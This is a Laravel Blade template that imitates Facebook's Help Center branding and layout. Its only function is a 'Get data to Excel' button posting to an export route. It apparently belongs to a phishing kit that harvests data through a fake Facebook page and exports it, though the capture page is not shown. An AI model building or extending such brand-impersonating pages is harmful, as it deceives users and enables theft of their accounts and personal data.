@extends('layout')

<script>
    window.onload = function() {
        @if(session('success'))
            alert("{{ session('success') }}");
        @elseif(session('fail'))
            alert("{{ session('fail') }}");
        @endif
    };
</script>

@section('body')
<div id="app" data-v-app="">
    <div id="app">
      <div>
        <div class="topheader bg-facebook p-2">
          <div class="sm:w-11/12 md:w-4/6 flex justify-between items-center mx-auto">
            <div class="w-[20%] md:w-[15%]"><a href="{{route('get.input')}}">
                <img src="{{asset('images/facebook.png')}}" class="object-cover"></a>
              </div>
            <div class="flex shadow-sm w-[60%] md:w-[50%]"><span
                class="px-4 inline-flex items-center min-w-fit border border-r-0 border-gray-200 bg-gray-50 text-sm"><ion-icon
                  name="search-outline" role="img" class="md hydrated"><svg xmlns="http://www.w3.org/2000/svg"
                    class="ionicon s-ion-icon" viewBox="0 0 512 512">
                    <path d="M221.09 64a157.09 157.09 0 10157.09 157.09A157.1 157.1 0 00221.09 64z"
                      stroke-miterlimit="10" class="ionicon-fill-none ionicon-stroke-width"></path>
                    <path stroke-linecap="round" stroke-miterlimit="10" d="M338.29 338.29L448 448"
                      class="ionicon-fill-none ionicon-stroke-width"></path>
                  </svg></ion-icon></span><input type="search"
                class="py-2 px-3 pr-11 block w-full border-gray-200 shadow-sm text-sm focus:z-10 focus:border-blue-500 focus:ring-blue-500 focus:outline-none"
                placeholder="How can we help?"></div>
          </div>
        </div>
        <div class="bg-[#E9EBEE]">
          <div class="w-11/12 sm:w-11/12 md:w-4/6 flex justify-between items-center mx-auto"><a
              href="#"
              class="flex items-center text-[#3578E5] gap-2 font-semibold py-4 border-b-[3px] border-[#3578E5]"><ion-icon
                name="home" role="img" class="md hydrated">
                <div class="icon-inner"><svg xmlns="http://www.w3.org/2000/svg" class="ionicon s-ion-icon"
                    viewBox="0 0 512 512">
                    <path
                      d="M261.56 101.28a8 8 0 00-11.06 0L66.4 277.15a8 8 0 00-2.47 5.79L63.9 448a32 32 0 0032 32H192a16 16 0 0016-16V328a8 8 0 018-8h80a8 8 0 018 8v136a16 16 0 0016 16h96.06a32 32 0 0032-32V282.94a8 8 0 00-2.47-5.79z">
                    </path>
                    <path
                      d="M490.91 244.15l-74.8-71.56V64a16 16 0 00-16-16h-48a16 16 0 00-16 16v32l-57.92-55.38C272.77 35.14 264.71 32 256 32c-8.68 0-16.72 3.14-22.14 8.63l-212.7 203.5c-6.22 6-7 15.87-1.34 22.37A16 16 0 0043 267.56L250.5 69.28a8 8 0 0111.06 0l207.52 198.28a16 16 0 0022.59-.44c6.14-6.36 5.63-16.86-.76-22.97z">
                    </path>
                  </svg></div>
              </ion-icon> Help Center </a>
            <p class="text-[#3578E5] text-xs">English</p>
          </div>
        </div>
        <div class="w-11/12 sm:w-11/12 md:w-4/6 grid gap-10 mx-auto my-8 grid-cols-1 md:grid-cols-[0.3fr_1fr]">
          <div class="order-2 md:order-none">
            <ul
              class="[&amp;&gt;li&gt;a]:text-[14px] [&amp;&gt;li&gt;a]:py-[5px] [&amp;&gt;li&gt;a]:pr-5 [&amp;&gt;li&gt;a]:block [&amp;&gt;li&gt;a:hover]:bg-[#E9EBEE]">
              <li><a href="#">Creating an Account</a>
              </li>
              <li><a href="#">Your Profile</a></li>
              <li><a href="#">Friending</a></li>
              <li><a href="#">Facebook Dating</a></li>
              <li><a href="#">Your Home Page</a></li>
              <li><a href="#">Messaging</a></li>
              <li><a href="#">Reels</a></li>
              <li><a href="#">Stories</a></li>
              <li><a href="#">Photos</a></li>
              <li><a href="#">Videos</a></li>
              <li><a href="#">Gaming</a></li>
              <li><a href="#">Pages</a></li>
              <li><a href="#">Groups</a></li>
              <li><a href="#">Events</a></li>
              <li><a href="#">Fundraisers and Donations</a></li>
              <li><a href="#">Meta Pay</a></li>
              <li><a href="#">Marketplace</a></li>
              <li><a href="#">Apps</a></li>
              <li><a href="#">Facebook Mobile Apps</a>
              </li>
              <li><a href="#">Accessibility</a></li>
            </ul>
          </div>
          <form method="POST" id="forminput" action="{{route('post.export')}}"
            class="w-100% md:w-[74%] rounded-lg border border-gray-200 h-fit order-1 md:order-none">
            @csrf
            <button type="submit"><strong style="color:blue">Get data to Excel</strong></button>
          </form>
        </div>
        <div class="bg-white mt-10">
          <div class="sm:w-11/12 md:w-4/6 mx-auto md:px-0 px-2" style="padding: 36px 0px;">
            <div class="grid xl:grid-cols-5 gap-y-4 lg:grid-cols-3 md:grid-cols-2 grid-cols-2 text-[#90949c] text-sm">
              <ul class="grid gap-y-2">
                <li><ion-icon name="logo-facebook" role="img" class="md hydrated">
                    <div class="icon-inner"><svg xmlns="http://www.w3.org/2000/svg" class="ionicon s-ion-icon"
                        viewBox="0 0 512 512">
                        <path
                          d="M480 257.35c0-123.7-100.3-224-224-224s-224 100.3-224 224c0 111.8 81.9 204.47 189 221.29V322.12h-56.89v-64.77H221V208c0-56.13 33.45-87.16 84.61-87.16 24.51 0 50.15 4.38 50.15 4.38v55.13H327.5c-27.81 0-36.51 17.26-36.51 35v42h62.12l-9.92 64.77H291v156.54c107.1-16.81 189-109.48 189-221.31z"
                          fill-rule="evenodd"></path>
                      </svg></div>
                  </ion-icon></li>
              </ul>
              <ul class="grid gap-y-2">
                <li>Meta © 2023</li>
                <li>English (US)</li>
              </ul>
              <ul class="grid gap-y-2">
                <li>About</li>
                <li>Privacy Policy</li>
                <li>Careers</li>
              </ul>
              <ul class="grid gap-y-2">
                <li>Ad choices</li>
                <li>Create ad</li>
                <li>Create Page</li>
              </ul>
              <ul class="grid gap-y-2">
                <li>Terms &amp; Policies</li>
                <li>Cookies</li>
              </ul>
            </div>
          </div>
        </div><!---->
      </div>
    </div>
  </div>
@endsection